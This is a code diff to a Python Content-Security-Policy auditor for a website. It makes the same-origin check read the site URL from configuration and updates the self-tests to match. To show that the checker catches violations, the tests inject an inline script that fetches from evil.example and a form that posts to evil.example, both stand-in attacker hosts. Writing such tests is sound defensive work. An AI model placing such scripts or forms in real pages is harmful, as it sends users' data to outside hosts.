@@ -139,8 +139,16 @@ _RES = {
 }
 
 
-def audit(html: str) -> list[str]:
-    """Everything this page loads or posts to that its own policy would refuse."""
+def audit(html: str, site_url: str) -> list[str]:
+    """Everything this page loads or posts to that its own policy would refuse.
+
+    `site_url` IS PASSED IN AND IS NOT A CONSTANT HERE, and the reason is written in CLAUDE.md
+    under The public URL. The site address is stated once and every surface that kept its own
+    copy of it drifted, three separate times, across a config file, a slide renderer, an email
+    builder and four collector User-Agents. The first draft of this file made it a fourth by
+    hardcoding the domain on the same-origin test below. It reads `site_build.SITE_URL` now,
+    which is the one string, so this checker cannot be the surface that disagrees.
+    """
     m = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]*)">', html)
     if not m:
         return ["no Content-Security-Policy meta tag on the page"]
@@ -165,7 +173,7 @@ def audit(html: str) -> list[str]:
             if not url.startswith(("http://", "https://", "//")):
                 continue                      # relative, covered by 'self'
             origin = "/".join(url.split("/")[:3])
-            if origin.rstrip("/") == "https://texasaidocket.com":
+            if origin.rstrip("/") == site_url.rstrip("/"):
                 continue                      # same origin written absolute
             if origin not in allowed:
                 out.append(f"{directive} would refuse {origin}")
@@ -174,6 +182,9 @@ def audit(html: str) -> list[str]:
 
 def self_test() -> int:
     fails = 0
+    # The fixture's own origin. The real one arrives from `site_build.SITE_URL`.
+    SELF = "https://example.test"
+
 
     def ok(label, cond, extra=""):
         nonlocal fails
@@ -193,7 +204,7 @@ def self_test() -> int:
 
     ok("the policy lands first inside the head, before anything it must govern",
        out.index("Content-Security-Policy") < out.index("<title>"))
-    ok("a real page passes its own audit", not audit(out), str(audit(out)))
+    ok("a real page passes its own audit", not audit(out, SELF), str(audit(out, SELF)))
     ok("script-src never carries 'unsafe-inline', which is the whole point",
        "'unsafe-inline'" not in policy(page).split("style-src-attr")[0])
     ok("every inline script is hashed, ld+json included",
@@ -205,23 +216,23 @@ def self_test() -> int:
     # THE GATE HAS TO GO RED, or it is decoration. Each case is a real way this breaks.
     tampered = out.replace("var a=1;", "var a=2;")
     ok("a script edited after the hash was taken is caught",
-       any("inline script is not hashed" in x for x in audit(tampered)), str(audit(tampered)))
+       any("inline script is not hashed" in x for x in audit(tampered, SELF)), str(audit(tampered, SELF)))
 
     injected = out.replace("</body>", "<script>fetch('https://evil.example')</script></body>")
     ok("an injected inline script is caught",
-       any("inline script is not hashed" in x for x in audit(injected)))
+       any("inline script is not hashed" in x for x in audit(injected, SELF)))
 
     foreign = out.replace("</body>", '<img src="https://tracker.example/p.gif"></body>')
     ok("an image from an origin nobody allowed is caught",
-       any("img-src would refuse https://tracker.example" in x for x in audit(foreign)),
-       str(audit(foreign)))
+       any("img-src would refuse https://tracker.example" in x for x in audit(foreign, SELF)),
+       str(audit(foreign, SELF)))
 
     exfil = out.replace("</body>", '<form action="https://evil.example/x"></form></body>')
     ok("a form posting somewhere nobody allowed is caught",
-       any("form-action would refuse https://evil.example" in x for x in audit(exfil)))
+       any("form-action would refuse https://evil.example" in x for x in audit(exfil, SELF)))
 
     ok("a page with no policy at all is caught",
-       audit(page) == ["no Content-Security-Policy meta tag on the page"])
+       audit(page, SELF) == ["no Content-Security-Policy meta tag on the page"])
 
     # The two limits this file admits to, asserted so a future edit cannot quietly reverse them.
     ok("frame-ancestors is absent, because a meta tag cannot deliver it",
